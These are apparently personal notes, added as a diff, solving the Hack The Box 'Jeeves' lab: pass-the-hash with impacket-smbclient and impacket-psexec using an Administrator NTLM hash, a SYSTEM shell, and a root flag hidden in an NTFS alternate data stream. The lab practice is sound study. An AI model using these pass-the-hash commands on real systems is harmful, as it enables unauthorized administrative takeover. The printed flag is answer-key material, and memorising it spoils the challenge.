+smbclient.py: error: unrecognized arguments: C$ -c get 'Windows10Upgrade\Windows10UpgraderApp.exe' /tmp/Windows10UpgraderApp.exe
+  #+end_src
+* how to use impacket-smbclient to get an interactive shell
+  #+begin_src bat
+  $ impacket-smbclient -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.10.10.63
+
+  # help
+  open {host,port=445} - opens a SMB connection against the target host/port
+  login {domain/username,passwd} - logs into the current SMB connection, no parameters for
+  <SNIP>                                              
+
+  # shares
+  ADMIN$
+  C$
+  IPC$
+
+  # use C$
+  # ls
+  drw-rw-rw-          0  Sat Nov  4 03:18:11 2017 $GetCurrent
+  drw-rw-rw-          0  Sat Nov  4 04:16:16 2017 $Recycle.Bin
+  -rw-rw-rw-     400228  Thu Oct 26 02:35:35 2017 bootmgr
+  -rw-rw-rw-          1  Thu Oct 26 02:35:34 2017 BOOTNXT
+  drw-rw-rw-          0  Wed Oct 25 22:42:54 2017 Documents and Settings
+  drw-rw-rw-          0  Mon Nov  6 03:15:36 2017 inetpub
+  drw-rw-rw-          0  Sat Nov  4 03:33:16 2017 Jenkins
+  -rw-rw-rw-  671088640  Wed Nov  5 12:14:55 2025 pagefile.sys
+  drw-rw-rw-          0  Thu Oct 26 02:39:24 2017 PerfLogs
+  drw-rw-rw-          0  Thu Oct 26 09:33:19 2017 Program Files
+  drw-rw-rw-          0  Sat Nov  4 03:26:13 2017 Program Files (x86)
+  drw-rw-rw-          0  Sat Nov  4 03:26:16 2017 ProgramData 
+  -rw-rw-rw-   16777216  Wed Nov  5 12:14:55 2025 swapfile.sys
+  drw-rw-rw-          0  Thu Oct 26 16:12:08 2017 System Volume Information
+  drw-rw-rw-          0  Wed Nov  8 23:22:28 2017 Users
+  drw-rw-rw-          0  Sun Dec 24 08:53:00 2017 Windows
+  drw-rw-rw-          0  Wed Nov  8 15:05:20 2017 Windows10Upgrade
+  # cd Windows10Upgrade
+
+  # ls
+  drw-rw-rw-          0  Wed Nov  8 15:05:20 2017 .
+  drw-rw-rw-          0  Wed Nov  8 15:05:20 2017 ..
+  drw-rw-rw-          0  Sat Nov  4 03:17:46 2017 2052
+  -rw-rw-rw-     459976  Sat Nov  4 03:17:39 2017 appraiserxp.dll
+  -rw-rw-rw-     118472  Sat Nov  4 03:17:40 2017 bootsect.exe
+  -rw-rw-rw-         24  Sat Nov  4 03:17:52 2017 Configuration.ini
+  -rw-rw-rw-      61640  Sat Nov  4 03:17:39 2017 cosquery.dll
+  -rw-rw-rw-     329928  Sat Nov  4 03:17:39 2017 DevInv.dll
+  drw-rw-rw-          0  Sat Nov  4 03:17:46 2017 dll1
+  drw-rw-rw-          0  Sat Nov  4 03:17:46 2017 dll2
+  -rw-rw-rw-     206536  Sat Nov  4 03:17:40 2017 downloader.dll
+  -rw-rw-rw-     643784  Sat Nov  4 03:17:39 2017 DW20.EXE
+  -rw-rw-rw-      49864  Sat Nov  4 03:17:39 2017 DWDCW20.DLL 
+  -rw-rw-rw-      45768  Sat Nov  4 03:17:40 2017 DWTRIG20.EXE
+  -rw-rw-rw-       9810  Sat Nov  4 03:17:40 2017 EnableWiFiTracing.cmd
+  -rw-rw-rw-      68808  Sat Nov  4 03:17:40 2017 ESDHelper.dll
+  -rw-rw-rw-      40648  Sat Nov  4 03:17:40 2017 esdstub.dll 
+  -rw-rw-rw-     564936  Sat Nov  4 03:17:40 2017 GatherOSState.EXE
+  -rw-rw-rw-     539848  Sat Nov  4 03:17:40 2017 GetCurrentDeploy.dll
+  -rw-rw-rw-     144072  Sat Nov  4 03:17:41 2017 GetCurrentOOBE.dll
+  -rw-rw-rw-      73416  Sat Nov  4 03:17:40 2017 GetCurrentRollback.EXE
+  -rw-rw-rw-      27848  Sat Nov  4 03:17:41 2017 HttpHelper.exe
+  drw-rw-rw-          0  Sat Nov  4 03:17:47 2017 resources
+  -rw-rw-rw-      63976  Wed Nov  8 15:05:48 2017 upgrader_default.log
+  -rw-rw-rw-     557256  Sat Nov  4 03:17:40 2017 wimgapi.dll 
+  -rw-rw-rw-     915656  Sat Nov  4 03:17:40 2017 windlp.dll
+  -rw-rw-rw-    1415880  Sat Nov  4 03:17:49 2017 Windows10UpgraderApp.exe
+  -rw-rw-rw-      25288  Sat Nov  4 03:17:41 2017 WinREBootApp32.exe
+  -rw-rw-rw-      25800  Sat Nov  4 03:17:41 2017 WinREBootApp64.exe
+
+  # get Windows10UpgraderApp.exe
+  # Bye!
+  #+end_src
+  just checked the strings of the above exe after downloading it, but it's huge.
+* OFFICIAL SOLUTION
+** pth-winexe
+   we can use this to get a shell
+   #+begin_src bat
+   $ pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee://10.10.10.63 cmd
+   #+end_src
+   so this just exits without error; according to chatgpt, winexe is very brittle and this is
+   a known issue across newer versions, so psexec is suggested
+   and sure enough, it works:
+   #+begin_src bat
+   $ impacket-psexec Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+
+[*] Requesting shares on 10.10.10.63.....
+[*] Found writable share ADMIN$
+[*] Uploading file kaKKMDVI.exe
+[*] Opening SVCManager on 10.10.10.63.....
+[*] Creating service OqVg on 10.10.10.63.....
+[*] Starting service OqVg.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+   #+end_src
+   ok, how come this is =NT AUTHORITY\SYSTEM=?
+   so, the solution involves something called an alternative data stream:
+   #+begin_src 
+   C:\Users\Administrator\Desktop> dir /R
+
+11/08/2017  09:05 AM    <DIR>          .
+11/08/2017  09:05 AM    <DIR>          ..
+12/24/2017  02:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+               2 Dir(s)   2,666,848,256 bytes free
+   #+end_src
+   "alternate data stream is a way to put a file within a file; an ntfs attribute." - ippsec
+   #+begin_src bat
+   C:\Users\Administrator\Desktop> powershell Get-Content -Path "hm.txt" -Stream "root.txt"
+   
+afbc5bd4b615a60648cec41c6ac92530
+   #+end_src
